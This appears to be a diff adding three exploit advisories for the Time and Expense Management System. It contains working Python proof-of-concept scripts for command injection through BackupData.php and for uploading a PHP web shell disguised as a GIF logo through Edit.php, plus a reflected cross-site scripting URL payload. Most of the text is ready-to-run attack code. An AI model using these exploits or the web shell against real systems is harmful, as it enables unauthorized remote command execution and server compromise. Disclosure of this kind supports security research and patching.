@@ -1,0 +1,206 @@
+# ------------------------------------------------------------------------
+# Software................Time and Expense Management System
+# Vulnerability...........Command Injection
+# Threat Level............Very Critical (5/5)
+# Download................http://sourceforge.net/projects/tems/
+# Discovery Date..........4/27/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A command injection vulnerability in Time and Expense Management
+# System can be exploited to execute arbitrary operating system commands.
+# 
+# 
+# --PoC--
+
+import socket
+
+host = 'localhost'
+path = '/tems'
+port = 80
+
+def run_command():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.settimeout(8)
+
+    body = '------x\r\n'\
+           'Content-Disposition: form-data; name="toFile"\r\n'\
+           '\r\n'\
+           './a\r\n'\
+           '------x\r\n'\
+           'Content-Disposition: form-data; name="DB_Admin_id"\r\n'\
+           '\r\n'\
+           'a\r\n'\
+           '------x\r\n'\
+           'Content-Disposition: form-data; name="DB_Admin_Password"\r\n'\
+           '\r\n'\
+           '../../../../../../../calc\x00a\r\n'\
+           '------x--\r\n'\
+           '\r\n'
+
+
+    s.send('POST %s/systemadmin/BackupData.php HTTP/1.1\r\n'
+           'Host: localhost\r\n'
+           'Proxy-Connection: keep-alive\r\n'
+           'User-Agent: x\r\n'
+           'Content-Length: %d\r\n'
+           'Cache-Control: max-age=0\r\n'
+           'Origin: null\r\n'
+           'Content-Type: multipart/form-data; boundary=----x\r\n'
+           'Accept: text/html\r\n'
+           'Accept-Language: en-US,en;q=0.8\r\n'
+           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
+           '\r\n%s' % (path, len(body), body))
+
+    print 'request sent, check for calc using the task manger'
+
+run_command()
+
+# ------------------------------------------------------------------------
+# Software................Time and Expense Management System
+# Vulnerability...........Arbitrary Upload
+# Threat Level............Very Critical (5/5)
+# Download................http://sourceforge.net/projects/tems/
+# Discovery Date..........4/27/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# An arbitrary upload vulnerability in Time and Expense Management
+# System can be exploited to upload a PHP shell.
+# 
+# 
+# --PoC--
+
+import socket
+
+host = 'localhost'
+path = '/tems'
+shell_path = path + '/images/logoshell.php'
+port = 80
+
+def upload_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.settimeout(8)    
+
+    s.send('POST ' + path + '/systemadmin/Edit.php HTTP/1.1\r\n'
+           'Host: localhost\r\n'
+           'Proxy-Connection: keep-alive\r\n'
+           'User-Agent: x\r\n'
+           'Content-Length: 938\r\n'
+           'Cache-Control: max-age=0\r\n'
+           'Origin: null\r\n'
+           'Content-Type: multipart/form-data; boundary=----x\r\n'
+           'Accept: text/html\r\n'
+           'Accept-Encoding: gzip,deflate,sdch\r\n'
+           'Accept-Language: en-US,en;q=0.8\r\n'
+           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
+           '\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="uid"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="name"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="address1"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="city"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="state"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="postalcode"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="country"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="weekendday"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="language"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="address2"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="logo"\r\n'
+           '\r\n'
+           'shell.php\r\n'
+           '------x\r\n'
+           'Content-Disposition: form-data; name="logo"; filename="shell.php"\r\n'
+           'Content-Type: image/gif\r\n'
+           '\r\n'
+           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
+           '------x--\r\n'
+           '\r\n')
+
+    resp = s.recv(8192)
+
+    http_found = 'HTTP/1.1 302'
+    http_ok = 'HTTP/1.1 200'
+    
+    if http_found not in resp[:len(http_found)]:
+        print 'error uploading shell'
+        return
+    else: print 'shell uploaded'
+
+    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
+           'Host: ' + host + '\r\n\r\n')
+
+    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
+    else: print 'shell located at http://' + host + shell_path
+
+upload_shell()
+
+------------------------------------------------------------------------
+Software................Time and Expense Management System
+Vulnerability...........Reflected Cross-site Scripting
+Threat Level............Low (1/5)
+Download................http://sourceforge.net/projects/tems/
+Discovery Date..........4/27/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A reflected cross-site scripting vulnerability in Time and Expense
+Management System can be exploited to execute arbitrary JavaScript.
+
+
+--PoC--
+
+http://localhost/tems/lookup.php?form=a%28%29;}alert%280%29;{//
